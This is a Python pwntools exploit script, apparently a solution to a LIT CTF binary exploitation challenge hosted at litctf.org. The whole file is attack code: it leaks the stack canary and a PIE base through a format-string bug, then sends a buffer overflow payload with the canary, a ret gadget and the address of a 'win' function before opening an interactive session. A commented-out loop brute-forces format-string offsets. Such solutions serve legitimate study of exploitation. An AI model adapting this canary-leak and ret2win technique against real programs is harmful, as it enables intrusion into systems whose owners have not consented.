from pwn import *

# for i in range(50):
#     io = start()
#     payload = f'%{i}$p'
#     io.sendline(payload)
#     resp = io.recv().decode()
#     print(resp, i)

# canary 33

# 13 17 36 41 45
# 0x5555555552ae.0x555555555274.0x555555555274.0x555555555100.0x55555555512e

# gadgets
ret = 0x101a

# io = process('../../lit/s')
io = remote('litctf.org', 31791)
elf = context.binary = ELF('../../lit/s', checksec=False)
payload = b'%33$p.%41$p'
io.sendline(payload)
resp = io.recv().decode().split('.')
canary = int(resp[0], 16)
pie = int(resp[1], 16) - 0x1100
elf.address = pie
print(hex(canary))
print(hex(pie))
payload = cyclic(40) + pack(canary) + pack(0) + pack(pie + ret) + pack(elf.sym.win)
io.sendline(payload)
io.interactive()
